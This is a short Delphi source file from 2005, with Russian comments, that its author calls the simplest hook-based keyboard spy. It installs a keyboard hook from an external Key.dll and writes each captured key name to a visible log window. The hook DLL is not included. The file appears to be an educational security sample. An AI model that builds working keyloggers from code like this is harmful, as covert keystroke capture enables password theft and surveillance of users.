unit Unit1;
// Простейший "Клавиатурный шпион" на базе ловушек
// Зайцев О.В, 2005. http://z-oleg.com/secur, http://z-oleg.com/delphi
// Для функционирования примера в папке программы должна находиться библиотека
// key.dll, содержащая ловушку.

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls;

const
  KeyEvent = WM_USER + 1;

type
  TKeyForm = class(TForm)
    meLogMemo: TMemo;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    procedure KeyEventHandler(var Msg : TMessage); message KeyEvent;
  public
    hLib: THandle;
  end;

var
  KeyForm: TKeyForm;

implementation


function SetKeyHook : Longint; stdcall; external 'Key.dll';
function DelKeyHook : Longint; stdcall; external 'Key.dll';

{$R *.dfm}

procedure TKeyForm.FormCreate(Sender: TObject);
begin
 SetKeyHook;
end;

procedure TKeyForm.FormDestroy(Sender: TObject);
begin
 DelKeyHook;
end;

procedure TKeyForm.KeyEventHandler(var Msg: TMessage);
var
 KeyName : string;
 Res     : integer;
begin
 // ***** Получение наименования клавиши *****
 // Выделение буфера
 SetLength(KeyName, 32);
 // Получение имени по коду, Res - длина возвращенной строки
 Res := GetKeyNameText(Msg.LParam, @KeyName[1], Length(KeyName));
 KeyName := copy(KeyName, 1, Res);
 // Добавление в протокол
 meLogMemo.Lines.Add(KeyName);
end;

end.
